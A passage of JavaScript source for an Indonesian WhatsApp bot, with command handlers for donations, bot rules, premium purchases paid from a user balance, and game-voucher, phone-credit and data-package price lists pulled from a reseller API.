{ buttonId: `${prefix}donasi`, buttonText: { displayText: '💰 Donate' }, type: 1 },
{ buttonId: `${prefix}sourcecode`, buttonText: { displayText: '👨‍💻 Countributor' }, type: 1 }
]
ronzz.sendMessage(from, { location: { jpegThumbnail: await reSize(fs.readFileSync(thumbnail), 300, 150) }, caption: teks, buttons: button, footer: `${botName} © 2022`, mentions: [sender,ownerNomer]}, { quoted: fkontak })
}
addCmd(command, 1, db_dashboard)
break

case 'owner':{
sendContact(from, ownerNomer, ownerName, msg)
}
addCmd(command, 1, db_dashboard)
break

case 'donasi': case 'donate':{
let teks = `Hallo *${cekUser("id", sender) !== null ? cekUser("name", sender) : `${pushname}`}* ${ucapanWaktu} 👋
*Mau donasi bot ya kak?*
*Pilih aja payment di bawah ya☺*

*Donasi • Emoney*
- *Dana : 08817839722*
- *Gopay : 08817839722*
- *Ovo : 08817839722*
- *Saweria : https://saweria.co/RonzzYT*
- *SociaBuzz : https://sociabuzz.com/ronzzofc/donate*
- *Qris : Scan qr di atas*

Membagikan sejumlah uang berupa donasi kepada fakir miskin yang membutuhkan tentu adalah perbuatan yang mulia. Dalam qur’an surah saba’ ayat 39 yang berbunyi 

وَمَا أَنْفَقْتُمْ مِنْ شَيْءٍ فَهُوَ يُخْلِفُهُ وَهُوَ خَيْرُ الرَّازِقِينَ

“Dan barang apa saja yang kamu nafkahkan, maka Allah akan menggantinya dan dia lah pemberi rezeki yang sebaik-baiknya.”`
let button = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: '📓 Menu' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: '🙍‍♂️ Owner' }, type: 1 },
{ buttonId: `${prefix}thanksto`, buttonText: { displayText: '👨‍💻 Countributor' }, type: 1 }
]
ronzz.sendMessage(from, { image: fs.readFileSync(qris), caption: teks, footer: `${botName} © 2022`, buttons: button}, { quoted: fkontak })
}
addCmd(command, 1, db_dashboard)
break

case 'sourcecode':{
let teks = `*-----------「 Thanks To 」-----------*
*- Ronzz YT ( Base Dan Creator )*
*- Saipul Anuar ( Mastah )*
*- Danzz Coding ( Mastah )*
*- ${ownerName} ( Owner )*
*- Adiwajshing ( Baileys )*`
ronzz.sendMessage(from, { location: { jpegThumbnail: await reSize(fs.readFileSync(source), 300, 150) }, caption: teks }, { quoted: msg })
}
addCmd(command, 1, db_dashboard)
break

case 'rules':{
let teks = `━━━━━━━━ *RULES-BOT* ━━━━━━━━

1. Jangan Spam/Mengeksploitasi Bot
Sanksi: *WARN/SOFT BLOCK*

2. Dilarang Tlpn/Vc Bot
Sanksi: *SOFT BLOCK*

3. Dilarang Culik Bot Ke Grup Kecuali Atas Izin Owner.
Sanksi: *PERMANENT BLOCK*

Jika sudah dipahami rules-nya, silakan pencet button di bawah untuk memulai!
Segala kebijakan dan ketentuan *${botName}* di pegang oleh owner dan segala perubahan kebijakan, sewaktu waktu owner berhak mencabut, atau memblokir user(*﹏*)`
reply2(teks)
}
addCmd(command, 1, db_dashboard)
break

case 'script': case 'sc':{
let teks = `Hallo *${cekUser("id", sender) !== null ? cekUser("name", sender) : `${pushname}`}* ${ucapanWaktu} 👋
*Script masih tahap perkembangan*

Ini adalah *BASE BOT MD* buatan *Ronzz YT*

*Link Script / Base Bot :*
https://github.com/Ronzz-Ofc/BaseMD

*Script no enc 100%*
*Mudah untuk di recode*
*Dll*`
reply2(teks)
}
addCmd(command, 1, db_dashboard)
break

case 'profile': case 'profil':{
let bio = (await ronzz.fetchStatus(sender).catch(console.error) || {}).status || '-'
try {
var ppnu = await ronzz.profilePictureUrl(sender, 'image')
} catch {
var ppnu = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'
}
let teks = `Hallo *${cekUser("id", sender) !== null ? cekUser("name", sender) : `${pushname}`}* ${ucapanWaktu} 👋
*Profile User*
⭔ID : @${sender.split('@')[0]}
⭔Register : ${cekUser("id", sender) !== null ? `✓
⭔Premium : ${cekUser("premium", sender) == true ? '✓' : '✘'}
⭔Name : ${cekUser("name", sender)}
⭔Resi : ${cekUser("resi", sender)}
⭔Registered On : ${cekUser("registerOn", sender)}` : `✘
⭔Premium : ✘
⭔Name : ${pushname}`}
⭔Bio : ${bio ? bio : '-'}
⭔Status : ${isOwner? 'Owner':'User'} ${botName}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`
let button = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: '📓 Menu' }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: '🙍‍♂️ Owner' }, type: 1 },
{ buttonId: `${prefix}donasi`, buttonText: { displayText: '💰 Donate' }, type: 1 }
]
ronzz.sendMessage(from, { image: { url: ppnu }, caption: teks, buttons: button, footer: `${botName} © 2022`, mentions: [sender]}, { quoted: fkontak })
}
addCmd(command, 1, db_dashboard)
break

case 'gcbot':
reply("https://chat.whatsapp.com/Eamzpgum2MXFUch9TBx75M")
addCmd(command, 1, db_dashboard)
break

case 'simi':
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`*Contoh* : ${prefix+command} Halo`)
fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
.then(balasSimi => {reply(balasSimi.success)})
addCmd(command, 1, db_dashboard)
break

case 'chat':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Nomor|Pesan\n\nContoh :\n${prefix+command} 628817839722|Hai`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let pesan = q.split('|')[1] ? q.split('|')[1] : ''
if (!nomor) return reply(`Ex : ${prefix+command} Nomor|Pesan\n\nContoh :\n${prefix+command} 628817839722|Hai`)
if (pesan.length <1) return reply(`Ex : ${prefix+command} Nomor|Pesan\n\nContoh :\n${prefix+command} 628817839722|Hai`)
let teks =`*| CHAT FITUR |*\n`
teks +=`Dari : ${sender.split('@')[0]}\n`
teks +=`Pesan : ${pesan}`
ronzz.sendMessage(`${nomor}@s.whatsapp.net`, {text: teks}, {quoted:fkontak})
}
addCmd(command, 1, db_dashboard)
break

case 'buyprem':{
if (cekUser("premium", sender) == true) return reply('Kamu sudah menjadi user premium.')
if (!q) return ronzz.sendMessage(from, { text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`, mentions: [sender], footer: `Mau buy premium ya? Silahkan pencet button di bawah ya kak`, buttonText: 'SELECT', sections: [{ title: `LIST HARGA PREMIUM`, rows: [{title: `🛒 BUY 15 HARI`, description: `Rp.10.000`, rowId: `${prefix}buyprem 1`},{title: `🛒 BUY 30 HARI`, description: `Rp.25.000.`, rowId: `${prefix}buyprem 2`},{title: `🛒 BUY 45 HARI`, description: `Rp.35.000`, rowId: `${prefix}buyprem 3`},{title: `🛒 BUY 60 HARI`, description: `Rp.45.000`, rowId: `${prefix}buyprem 4`},{title: `🛒 BUY PERMANENT`, description: `Rp.60.000`, rowId: `${prefix}buyprem 5`}]}]}, { quoted: fkontak })
if (/1/.test(q)) {
if (cekSaldo(sender, db_saldo) < 10000) return reply(`Maaf *${cekUser("name", sender)}*, saldo kamu tidak mencukupi silahkan melakukan deposit terlebih dahulu sebelum membeli`)
minSaldo(sender, 10000, db_saldo)
setUser("premium", sender, true)
ronzz.sendTextMentions(from, `*Memuat Data* › @${sender.split('@')[0]}`, [sender])
await sleep(500)
ronzz.sendTextMentions(from, `*──── TERVERIFIKASI ────*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
await sleep(1000)
ronzz.sendTextMentions(`${ownerNomer}@s.whatsapp.net`, `*REGISTER PREMIUM*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
}
if (/2/.test(q)) {
if (cekSaldo(sender, db_saldo) < 25000) return reply(`Maaf *${cekUser("name", sender)}*, saldo kamu tidak mencukupi silahkan melakukan deposit terlebih dahulu sebelum membeli`)
minSaldo(sender, 25000, db_saldo)
setUser("premium", sender, true)
ronzz.sendTextMentions(from, `*Memuat Data* › @${sender.split('@')[0]}`, [sender])
await sleep(500)
ronzz.sendTextMentions(from, `*──── TERVERIFIKASI ────*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
await sleep(1000)
ronzz.sendTextMentions(`${ownerNomer}@s.whatsapp.net`, `*REGISTER PREMIUM*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
}
if (/3/.test(q)) {
if (cekSaldo(sender, db_saldo) < 35000) return reply(`Maaf *${cekUser("name", sender)}*, saldo kamu tidak mencukupi silahkan melakukan deposit terlebih dahulu sebelum membeli`)
minSaldo(sender, 35000, db_saldo)
setUser("premium", sender, true)
ronzz.sendTextMentions(from, `*Memuat Data* › @${sender.split('@')[0]}`, [sender])
await sleep(500)
ronzz.sendTextMentions(from, `*──── TERVERIFIKASI ────*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
await sleep(1000)
ronzz.sendTextMentions(`${ownerNomer}@s.whatsapp.net`, `*REGISTER PREMIUM*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
}
if (/4/.test(q)) {
if (cekSaldo(sender, db_saldo) < 45000) return reply(`Maaf *${cekUser("name", sender)}*, saldo kamu tidak mencukupi silahkan melakukan deposit terlebih dahulu sebelum membeli`)
minSaldo(sender, 45000, db_saldo)
setUser("premium", sender, true)
ronzz.sendTextMentions(from, `*Memuat Data* › @${sender.split('@')[0]}`, [sender])
await sleep(500)
ronzz.sendTextMentions(from, `*──── TERVERIFIKASI ────*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
await sleep(1000)
ronzz.sendTextMentions(`${ownerNomer}@s.whatsapp.net`, `*REGISTER PREMIUM*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
}
if (/5/.test(q)) {
if (cekSaldo(sender, db_saldo) < 60000) return reply(`Maaf *${cekUser("name", sender)}*, saldo kamu tidak mencukupi silahkan melakukan deposit terlebih dahulu sebelum membeli`)
minSaldo(sender, 60000, db_saldo)
setUser("premium", sender, true)
ronzz.sendTextMentions(from, `*Memuat Data* › @${sender.split('@')[0]}`, [sender])
await sleep(500)
ronzz.sendTextMentions(from, `*──── TERVERIFIKASI ────*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
await sleep(1000)
ronzz.sendTextMentions(`${ownerNomer}@s.whatsapp.net`, `*REGISTER PREMIUM*
⭔ID : @${sender.split('@')[0]}
⭔Name : ${pushname}
⭔Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}`, [sender])
}
}
addCmd(command, 1, db_dashboard)
break

case 'topup':
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (cekSaldo(sender,db_saldo) == 0) return reply(`Maaf *${cekUser("name", sender)}*, sepertinya saldo kamu Rp0 Silahkan melakukan deposit terlebih dahulu sebelum topup`)
if (!fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
const sections = [
{title: "𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗚𝗮𝗺𝗲",
rows: [
{title: "Garena Shell Murah", rowId: "topup_garena_shell", description: "Menampilkan list harga Voucher Garena Shell"},
{title: "Garena Free Fire", rowId: "topup_diamond_ff", description: "Menampilkan list harga Diamond FF"},
{title: "Mobile Legends", rowId: "topup_diamond_ml", description: "Menampilkan list harga Diamond ML"},
]},
{title: "𝗧𝗼𝗸𝗲𝗻 𝗟𝗶𝘀𝘁𝗿𝗶𝗸",
rows: [
{title: "Token PLN Murah", rowId: "topup_token_pln", description: "Menampilkan list harga Token PLN"},
]},
{title: "𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗦𝗮𝗹𝗱𝗼",
rows: [
{title: "Saldo Ovo", rowId: "topup_saldo_ovo", description: "Menampilkan list harga Saldo Ovo"},
{title: "Saldo Dana", rowId: "topup_saldo_dana", description: "Menampilkan list harga Saldo Dana"},
{title: "Saldo Gopay", rowId: "topup_saldo_gopay", description: "Menampilkan list harga Saldo Gopay"},
{title: "Saldo LinkAja", rowId: "topup_saldo_linkaja", description: "Menampilkan list harga Saldo Linkaja"},
{title: "Saldo ShopeePay", rowId: "topup_saldo_shoope", description: "Menampilkan list harga Saldo ShopeePay"},
]},
{title: "𝗞𝘂𝗼𝘁𝗮 𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁",
rows: [
{title: "Internet XL", rowId: prefix+"topup_internet_xl", description: "Menampilkan list harga Internet XL"},
{title: "Internet Axis", rowId: prefix+"topup_internet_axis", description: "Menampilkan list harga Internet Axis"},
{title: "Internet Three", rowId: prefix+"topup_internet_three", description: "Menampilkan list harga Internet Three"},
{title: "Internet Indosat", rowId: prefix+"topup_internet_indosat", description: "Menampilkan list harga Internet ndosat"},
{title: "Internet Telkomsel", rowId: prefix+"topup_internet_telkomsel", description: "Menampilkan list harga Internet Telkomsel"},
]},
{title: "𝗣𝘂𝗹𝘀𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿",
rows: [
{title: "Pulsa XL", rowId: "topup_pulsa_xl", description: "Menampilkan list harga Pulsa XL"},
{title: "Pulsa Axis", rowId: "topup_pulsa_axis", description: "Menampilkan list harga Pulsa Axis"},
{title: "Pulsa Three", rowId: "topup_pulsa_three", description: "Menampilkan list harga Pulsa Three"},
{title: "Pulsa Indosat", rowId: "topup_pulsa_indosat", description: "Menampilkan list harga Pulsa Indosat"},
{title: "Pulsa Telkomsel", rowId: "topup_pulsa_telkomsel", description: "Menampilkan list harga Pulsa Telkomsel"},
]},
{title: "𝗣𝗿𝗲𝗺𝗶𝘂𝗺 & 𝗦𝗲𝘄𝗮𝗯𝗼𝘁",
rows: [
{title: "Premium", rowId: prefix+"buyprem", description: "Menampilkan list harga premium"},
{title: "Sewa Bot", rowId: prefix+"gcbot", description: "Rp.10.000/Minggu"},
]}
]
let isian = `List produk yang kami
sediakan, silahkan pilih salah satu.`
const button_topup = {
text: isian,
buttonText: "ᴘɪʟɪʜ ᴘʀᴏᴅᴜᴋ",
sections
}
var object_buy = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
number: sender,
session: 'PILIH-GAME',
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
data: {
id_target: '',
id_zone: '',
id_produk: '',
id_topup: '',
harga_topup: '',
produk_topup: ''
}
}
fs.writeFile(topupPath + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
ronzz.sendMessage(from, button_topup)
})
} else {
var buttonMessage = {
text: `Hey, sepertinya kamu masih ada proses yang belum diselesaikan, Ingin batal? click batal dibawah 👇🏻`,
footer: footer,
buttons: [
{ buttonId: 'batal_order', buttonText: {displayText: 'Batal'}, type: 1},
],
headerType: 1
}
ronzz.sendMessage(from, buttonMessage, {quoted:msg})
}
break
case 'listharga':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
const sections = [
{title: "Topup & Voucher Game",
rows: [
{title: "Garena Shell Murah", rowId: prefix+"list_garena_shell", description: "Menampilkan list harga Voucher Garena Shell"},
{title: "Garena Free Fire", rowId: prefix+"list_diamond_ff", description: "Menampilkan list harga Diamond FF Murah"},
{title: "Mobile Legends", rowId: prefix+"list_diamond_ml", description: "Menampilkan list harga Diamond ML Murah"},
]},
{title: "Saldo & Token PLN",
rows: [
{title: "Convert Saldo", rowId: prefix+"convert_list", description: "Menampilkan list produk Convert Saldo"},
{title: "Token Listrik PLN", rowId: prefix+"list_token_pln", description: "Menampilkan list harga Token PLN"},
]},
{title: "Kuota & Pulsa",
rows: [
{title: "Kuota Internet", rowId: prefix+"kuota_list", description: "Menampilkan list produk Kuota Internet"},
{title: "Pulsa Transfer", rowId: prefix+"pulsa_list", description: "Menampilkan list produk Pulsa Transfer"},
]},
{title: "Premium & Sewabot",
rows: [
{title: "Premium", rowId: prefix+"buyprem", description: "Menampilkan list harga premium"},
{title: "Sewa Bot", rowId: prefix+"gcbot", description: "Rp.10.000/Minggu"},
]}
]
let isian = `List harga produk yang kami
sediakan, silahkan pilih salah satu.`
const listMessage = {
text: isian,
buttonText: 'ʟɪsᴛ ʜᴀʀɢᴀ',
sections
}
ronzz.sendMessage(from, listMessage)
}
break
case 'convert_list':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
const sections = [
{title: "𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗦𝗮𝗹𝗱𝗼",
rows: [
{title: "Saldo Ovo", rowId: prefix+"list_saldo_ovo", description: "Menampilkan list harga Saldo Ovo"},
{title: "Saldo Dana", rowId: prefix+"list_saldo_dana", description: "Menampilkan list harga Saldo Dana"},
{title: "Saldo Gopay", rowId: prefix+"list_saldo_gopay", description: "Menampilkan list harga Saldo Gopay"},
{title: "Saldo LinkAja", rowId: prefix+"list_saldo_linkaja", description: "Menampilkan list harga Saldo LinkAja"},
{title: "Saldo ShopeePay", rowId: prefix+"list_saldo_shoope", description: "Menampilkan list harga Saldo ShopeePay"},
]}
]
let isian = `List harga produk yang kami
sediakan, silahkan pilih salah satu.`
const listMessage = {
text: isian,
buttonText: 'ʟɪsᴛ ʜᴀʀɢᴀ',
sections
}
ronzz.sendMessage(from, listMessage)
}
break
case 'kuota_list':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
const sections = [
{title: "𝗞𝘂𝗼𝘁𝗮 𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁",
rows: [
{title: "Internet XL", rowId: prefix+"list_internet_xl", description: "Menampilkan list harga Internet XL"},
{title: "Internet Axis", rowId: prefix+"list_internet_axis", description: "Menampilkan list harga Internet Axis"},
{title: "Internet Three", rowId: prefix+"list_internet_three", description: "Menampilkan list harga Internet Three"},
{title: "Internet Indosat", rowId: prefix+"list_internet_indosat", description: "Menampilkan list harga Internet ndosat"},
{title: "Internet Telkomsel", rowId: prefix+"list_internet_telkomsel", description: "Menampilkan list harga Internet Telkomsel"},
]}
]
let isian = `List harga produk yang kami
sediakan, silahkan pilih salah satu.`
const listMessage = {
text: isian,
buttonText: 'ʟɪsᴛ ʜᴀʀɢᴀ',
sections
}
ronzz.sendMessage(from, listMessage)
}
break
case 'pulsa_list':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
const sections = [
{title: "𝗣𝘂𝗹𝘀𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿",
rows: [
{title: "Pulsa XL", rowId: prefix+"list_harga_xl", description: "Menampilkan list harga Pulsa XL"},
{title: "Pulsa Axis", rowId: prefix+"list_harga_axis", description: "Menampilkan list harga Pulsa Axis"},
{title: "Pulsa Three", rowId: prefix+"list_harga_three", description: "Menampilkan list harga Pulsa Three"},
{title: "Pulsa Indosat", rowId: prefix+"list_harga_indosat", description: "Menampilkan list harga Pulsa Indosat"},
{title: "Pulsa Telkomsel", rowId: prefix+"list_harga_telkomsel", description: "Menampilkan list harga Pulsa Telkomsel"},
]}
]
let isian = `List harga produk yang kami
sediakan, silahkan pilih salah satu.`
const listMessage = {
text: isian,
buttonText: "List Harga Produk",
sections
}
ronzz.sendMessage(from, listMessage)
}
break

// KUOTA INTERNET
case 'list_internet_indosat':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("IDF")) {
listff.push(x)
}
}
var teks = `*List Harga Internet Indosat*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_internet_telkomsel':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("SDF")) {
listff.push(x)
}
}
var teks = `*List Harga Internet Telkomsel*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_internet_axis':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("AXD")) {
listff.push(x)
}
}
var teks = `*List Harga Internet Axis*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_internet_xl':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("XLD")) {
listff.push(x)
}
}
var teks = `*List Harga Internet XL*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_internet_three':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("TDA")) {
listff.push(x)
}
}
var teks = `*List Harga Internet Three*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n*Note :* ${i.note}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break

// VOUCHER GAME
case 'list_garena_shell':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("VGR")) {
listff.push(x)
}
}
var teks = `*List Harga Voucher Garena Shell*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_diamond_ff':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listff = [];
for (let x of res.data.data) {
if (x.code.includes("FF")) {
listff.push(x)
}
}
var teks = `*List Harga Diamond Free Fire*\n\n`
listff.sort(regExcomp)
for (let i of listff) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_diamond_ml':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listml = [];
for (let x of res.data.data) {
if (x.code.startsWith("VMLSO")) {
listml.push(x)
}
}
var teks = `*List Harga Diamond Mobile Legends*\n\n`
listml.sort(regeXcomp)
for (let i of listml) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break

// PULSA TRANSFER
case 'list_harga_telkomsel':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
if (x.code.startsWith("STF")) {
listaov.push(x)
}
}
var teks = `*List Harga Pulsa Telkomsel*\n\n`
listaov.sort(regeXcomp)
for (let i of listaov) {
teks += `*Title :* ${i.name}\n*Harga :* Rp${toRupiah(i.price)}\n*Status :* ${i.status}\n\n`
}
teks += `_ingin melakukan topup?_\n_ketik:_ *#topup*\n\n_ingin melakukan isi saldo?_\n_ketik:_ *#deposit*\n\n_ingin melihat produk topup?_\n_ketik:_ *#listharga*\n\n*Penjelasan :*\n_Available : Stok Ready_ ✅\n_Empty : Stok Habis_ ❎`
reply(teks)
})
}
break
case 'list_harga_indosat':{
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regeXcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
var listaov = [];
for (let x of res.data.data) {
